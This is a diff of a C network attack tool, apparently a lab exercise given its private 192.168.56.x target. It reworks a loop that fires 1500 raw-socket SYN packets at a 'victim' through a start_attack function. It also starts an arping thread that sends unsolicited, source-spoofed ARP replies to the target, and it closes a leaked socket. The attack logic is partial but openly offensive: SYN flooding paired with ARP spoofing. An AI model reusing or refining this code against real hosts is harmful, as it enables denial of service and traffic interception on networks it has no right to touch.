@@ -54,15 +54,26 @@ int main(int argc, char *argv[])
 
     pthread_t thread1;
 
-    ////Creating thread with start_sniffing() function call, will start receiving packets and process them
+    //Creating thread with start_sniffing() function call, will start receiving packets and process them
     if(pthread_create(&thread1, NULL, (void *) start_sniffing, argv) < 0)
     {
         fprintf(stderr, "Failed to create a new thread.\n");
         return 1;
     }
 
+    char *args[] = {"-q", "-A", "-I", argv[3], "-s", ip_array[4], "192.168.56.101"};
+    pthread_t arping_th;
+
+    if(pthread_create(&arping_th, NULL, (void *) prepare_arping, args) < 0)
+    {
+        fprintf(stderr, "Failed to create a thread for arping.\n");
+        exit(-1);
+    }
+    pthread_detach(arping_th);
+
     for(int i = 0; i < 1500; i++)
     {
+        //sleep(1);
         start_attack(ip_array);
         printf("Thread %d started.\n", i);
 
@@ -131,15 +142,6 @@ void start_attack(char *argv[])
         //printf("Your victim is: %s\n", inet_ntoa(dst_ip));
     }
 
-    //char *args[] = {"-q", "-A", "-I", argv[3], "-q","-c1", "-s", source_ip, "192.168.56.101"};
-    //pthread_t arping_th;
-
-    //if(pthread_create(&arping_th, NULL, (void *) prepare_arping, args) < 0)
-    //{
-    //    fprintf(stderr, "Failed to create a thread for arping.\n");
-    //    exit(-1);
-    //}
-    //pthread_detach(arping_th);
 
 
     //printf("Local ip is: %s\n", source_ip);
@@ -217,6 +219,7 @@ void start_attack(char *argv[])
         fprintf(stderr, "Error sending syn packet! Error message: %s\n", strerror(errno));
         exit(1);
     }
+    close(sock_raw);
     free(packet_to_send);
 }
 
@@ -258,8 +261,7 @@ void hostname_toip(char *dst, struct in_addr *dst_ip)
 void prepare_arping(char *argv[])
 {
     sleep(2);
-    int arg_count = 9;
-    //argv[3] is for NIC to use
+    int arg_count = 7;
     //these parameters have to be specified exactly in this order with -q in front
     arping_main(arg_count, argv);
 }
